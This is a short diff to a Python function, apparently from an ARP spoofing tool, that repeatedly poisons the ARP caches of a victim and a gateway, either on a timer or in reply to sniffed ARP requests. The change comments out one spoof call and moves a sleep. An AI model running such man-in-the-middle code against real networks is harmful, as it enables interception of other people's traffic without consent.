@@ -61,14 +61,14 @@ def ARPSpoof(victim_ip, gateway_ip, interface, attacker_ip, silent = True, mitm 
     arp = ARP(attacker, victim, gateway, interface)
     if n_times <= 0:
         while True:
-            arp.spoof(mitm)
+            #arp.spoof(mitm)
             if silent:
                 pkt = sniff(count=1, filter="arp")
                 if(pkt[0]["ARP"].pdst == victim_ip or pkt[0]["ARP"].pdst == gateway_ip) :
                     arp.spoof(mitm)
             else:
-                time.sleep(wait_time)
                 arp.spoof(mitm)
+                time.sleep(wait_time)
     else:
         arp.spoof()
 
